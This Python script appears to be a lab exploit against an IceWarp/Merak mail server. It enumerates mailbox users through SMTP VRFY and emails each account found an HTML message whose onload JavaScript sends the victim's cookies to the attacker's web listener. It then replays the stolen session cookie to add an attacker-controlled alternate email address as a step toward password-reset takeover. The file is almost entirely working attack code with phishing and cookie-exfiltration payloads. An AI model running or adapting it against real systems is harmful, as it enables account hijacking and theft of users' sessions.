#!/usr/bin/env python3
from os.path import realpath, dirname
from os import system, environ, popen, kill
from filecmp import cmp as file_cmp
from psutil import net_connections
from signal import SIGTERM
from subprocess import Popen
from pathlib import Path
from smtplib import SMTP
from time import sleep
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import requests
import sys
import urllib.parse
import nmap
import asyncore
import smtpd
import socket

# nmap scan
  # check if host alive
  # check for Merak 8.9.1 or compatiable server
	# TCP/25

# check if user list
    # download a good list

# manually attempt to get the domain + usernames
	# socket convo
	# iterate through users
	# parse the reply traffic for domain
	# store results

# drum up web server to host shell payloads
	# find a script somewhere or do it manually
	# determine encoding

# drum up reverse shell listener
	# multi connection

_Gr="\u001b[32;1m"
_End="\u001b[0m"


clean = False
debug = 0
RHOST=None          # Global RHOST
RPORT_WEB=32000     # Web service
RPORT_SMTP=25
LHOST=(popen('ifconfig tap0 | grep -w "inet" | cut -d" " -f10').read()).strip()
LPORT_WEB=8080
LPORT_SMTP=25
mode = "cookie_monster"
for i,x in enumerate(sys.argv):
    if x.lower() in ["-r","--rhost"]:
        RHOST=sys.argv[i+1]
    elif x.lower() in ["-l","--lhost"]:
        LHOST=sys.argv[i+1]
    elif x.lower() in ["-p","--rport_web"]:
        RPORT_WEB=int(sys.argv[i+1])
    elif x.lower() in ["-lpw","--lport_web"]:
        LPORT_WEB=int(sys.argv[i+1])
    elif x.lower() in ["-rps","--rport_smtp"]:
        RPORT_SMTP=int(sys.argv[i+1])
    elif x.lower() in ["-lps","--lport_smtp"]:
        LPORT_SMTP=int(sys.argv[i+1])
    elif x.lower() in ["-d"]:
        debug = 1
    elif x.lower() in ["-dd"]:
        debug = 2
    elif x.lower() in ["--clean"]:
        clean = True
    elif x.lower() in ["-m","--mode"]:
        mode = sys.argv[i+1]

        
if RHOST is None:
    sys.stderr.write("[-] RHOST (-r / --rhost) is mandatory!\n\n")
    sys.exit(-1)
if debug > 0:
    print(f"[*] Using RHOST: {RHOST}")
    print(f"[*] Using RPORT_WEB: {RPORT_WEB}")
    print(f"[*] Using RPORT_SMTP:{RPORT_SMTP}")

if LHOST == '':
    sys.stderr.write("[-] Tap0 not up.  Are you conencted to the lab\n")
    sys.exit(-1)
if debug > 0:
    print(f"[*] Using LHOST: {LHOST}")
    print(f"[*] Using LPORT_WEB: {LPORT_WEB}")
    print(f"[*] Using LPORT_SMTP:{LPORT_SMTP}")

if mode not in ["cookie_monster","pwn"]:
    sys.stderr.write("[-] Modes Availible: 'cookie-monster' 'pwn'\n")
    sys.exit(-1)
if debug > 0:
    print(f"[*] Using mode: {mode}")

if clean:
    if debug > 0:
        sys.stdout.write("[D] Cleaning things up... \n")
    system( "rm ./cirt-default-usernames.txt 1>/dev/null 2>&1")


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;; INITIAL RECON ;;;;;;;;
# Host detection and service detection
nmap_args = f"-sS -p{RPORT_SMTP}"
nm = nmap.PortScanner()
nm.scan(hosts=RHOST,arguments=nmap_args)

if nm[RHOST]['status']['state'] not in ['up']:
    sys.stderr.write(f"[-] Host {RHOST} is not up\n\n")
    sys.exit(-1)
sys.stdout.write(f"{_Gr}[+] {RHOST} appears up{_End}\n")

if nm[RHOST]['tcp'][RPORT_SMTP]['state'] not in ['open','open|filtered']:
    sys.stderr.write(f"[-] Port {RPORT_SMTP} is not open on rhost {RHOST}\n\n")
    sys.exit(-1)
sys.stdout.write(f"{_Gr}[+] {RHOST}:{RPORT_SMTP} appears open{_End}\n")
sys.stdout.flush()


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;; Gathering wordlist  ;;;;;;;;;;;
list_file = './cirt-default-usernames.txt'
smtpusers = Path(list_file)
if not smtpusers.exists():
    sys.stdout.write("[*] Fetching a better list file than what nmap provides by default..\n")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt"
    with open(list_file,"wb") as list_file_fd:
        response = requests.get(url)
        list_file_fd.write(response.content)
    sys.stdout.write(f"[*] List file saved as: {list_file}\n")
else:
    sys.stdout.write("[*] Looks like an smtp users list is already present...\n")
sys.stdout.flush()


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;; User account enumeration ;;;;;;

# Connection and greeting
ctr = 0
ctr_total = 0
accounts = []
sys.stdout.write(   "[*] Enumerating email accounts\n"\
                    "+------------------------------\n"\
                    "| '.' = invalid list entry\n"\
                    "| '*' = doesn't exist\n"\
                    "| '!' = account found\n"\
                    "-------------------------------\n")
sys.stdout.flush()
with open(list_file,"r") as fd:
    for line in fd:
        line = line.strip()

        if ctr == 50:
            ctr = 0
            ctr_total += 50
            sys.stdout.write(f"[{ctr_total}]\n")
            sys.stdout.flush()

        if not line.isalnum():
            ctr +=  1
            sys.stdout.write(".")
            sys.stdout.flush()
            continue

        smtp_fd = SMTP(RHOST,RPORT_SMTP)
        smtp_fd.helo("40299")
        
        result = smtp_fd.verify(f"{line}")

        if "No such user found" in result[1].decode():
            sys.stdout.write("*")
            sys.stdout.flush()
            ctr += 1
            continue
        elif line in result[1].decode():
            if line in result[1].decode().split('<')[1].split('>')[0]:
                ctr += 1
                sys.stdout.write(f"{_Gr}!{_End}")
                account = result[1].decode().split('<')[1].split('>')[0]
                accounts.append(account)

sys.stdout.write(   f"\n"
                    f"Accounts found\n"
                    f"--------------\n")
for account in accounts:
    print(account)

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;; Phish Selection ;;;;;;;;;

    if mode == "cookie_monster":
        # If Cookie Monster...
        email_body = f"""
        '<html>
            <body onload='document.location.replace("http://{LHOST}:{LPORT_WEB}/cookie="+document.cookie+"<br>"+"URL:"+document.location);'>
            </body>
        </html>'
    """

    elif mode == "pwn":
        # If Pwn...
        email_body = f"""
        '<html>
            <body onload='document.location.replace("http://{LHOST}:{LPORT_WEB}/pwn<br>URL:"+document.location);'>
            </body>
        </html>'
        """

    email_body = MIMEText(email_body,'html')



for account in accounts:
    
    fromaddr = f"OS-40299@{LHOST}"
    toaddr = account

    hdr_fromaddr = f"From: OS-40299@{LHOST}\r\n"
    hdr_toaddr = f"To: {account}\r\n\r\n"

    message = MIMEMultipart("alternative")
    message["Subject"] = "lol"
    message["From"] = fromaddr
    message["To"] = toaddr
    message.attach(email_body)

    with SMTP(RHOST,RPORT_SMTP) as fd:
        fd.sendmail(fromaddr,toaddr,message.as_string())

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:
# ;;;;;;;;; Capture credentials ;;;;;;;;;
# ;;;;;;;;; for mis-use later   ;;;;;;;;;

# Listen
# Handle the XSS traffic
# Extract cookie
# place cookie into adding localhost as SMTP
# send the request
# Initiate password reset

class EchoHandler(asyncore.dispatcher_with_send):
    def handle_read(self):
        data = self.recv(8192)
        if data:
            if debug > 0:
                print(f"[D] {data}")
            cookie = ''
            new_id = {}
            new_cookie = {}
            if("GET /cookie=" in data[0:12].decode()):
                sys.stdout.write(f"{_Gr}[+] User Cookie obtained!{_End}\n")
                sys.stdout.flush()
                for i in range(0,len(data)-144):
                    if(data[i:i+4].decode() == "?id="):
                        new_id['id'] = data[i+1:i+36].decode().split('=')[1]
                    if(data[i:i+7].decode() == "cookie="):
                        if "js_cipher=" in data[i+7:i+17].decode():
                            cookie = urllib.parse.unquote(data[i+7:i+75].decode()).split(';')
                        elif "IceWarpWebMailSignUp=" in data[i+12:i+32].decode():
                            cookie = urllib.parse.unquote(data[i+7:i+143].decode()).split(';')
                
                if debug > 0:
                    print(f"[D] Cookie: {cookie}")
                    print(f"[D] id {new_id}")
                
                for x in cookie:
                    x = x.split('=')
                    for i in range(len(x)-1):
                        if i % 2 == 0:
                            new_cookie[x[i].strip()] = x[i+1].strip()
                    
                if debug > 0:
                    print(f"[D] {new_cookie}")
                
                _break = False
                for i in range(0,10):
                    if _break:
                        break
                    print(f"[*] Adding attacker server to alternate email...({i})")
                    post_data = {"id":f"{new_id['id']}","accountid":f"{i}","Save_x":"1","action":"mod","account[USER]":"victim.com\\admin","account[EMAIL]":"admin@victim.com","account[PASS]":"*****","account[PASS2]":"*****","account[FULLNAME]":"Admin","account[ALTEMAIL]":"OS-40299@192.168.102.46","account[HOSTUSER]":"victim.com\\admin","account[COLOR]":"","Save_x":"Save+Changes"}
                    r1 = requests.post(f"http://{RHOST}:{RPORT_WEB}/mail/accountsettings_add.html",data=post_data,cookies=new_cookie)
                    print("[*] Checking to see if worked...")
                    post_data2 = {"id":f"{new_id['id']}","posted":"1","FBmod":"Modify","accountid":f"{i}"}
                    r2 = requests.post(f"http://{RHOST}:{RPORT_WEB}/mail/accountsettingsaction.html",data=post_data2,cookies=new_cookie)
                    
                    if debug > 0:
                         print(f"[D] {r2.text}")
                    
                    for i in range(0,len(r2.text)-103):
                        if '<TD ><INPUT TYPE="text" NAME="account[ALTEMAIL]" VALUE="OS-40299@192.168.102.46"  CLASS="ilong"></TD>' in r2.text[i:i+103]:
                            print("[!] Attacker SMTP Server successfully added!")
                            _break = True
                            break
    
class EchoServer(asyncore.dispatcher):
    def __init__(self, host, port):
        asyncore.dispatcher.__init__(self)
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.set_reuse_addr()
        self.bind((host, port))
        self.listen(5)
    def handle_accept(self):
        pair = self.accept()
        if pair is not None:
            sock, addr = pair
            print(f'[+] Incoming connection from {repr(addr)}')
            handler = EchoHandler(sock)
    
class CustomSMTPServer(smtpd.SMTPServer):
    def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):
        print("----------------------------------------")
        print(f'Receiving message from: {peer}')
        print(f'Message addressed from: {mailfrom}')
        print(f'Message addressed to  : {rcpttos}')
        print(f'Message: {data.decode()}')
        print("-----------------------------------------")
        return
    
server1 = EchoServer(LHOST,LPORT_WEB)
server2 = CustomSMTPServer((LHOST,LPORT_SMTP),None)
asyncore.loop()
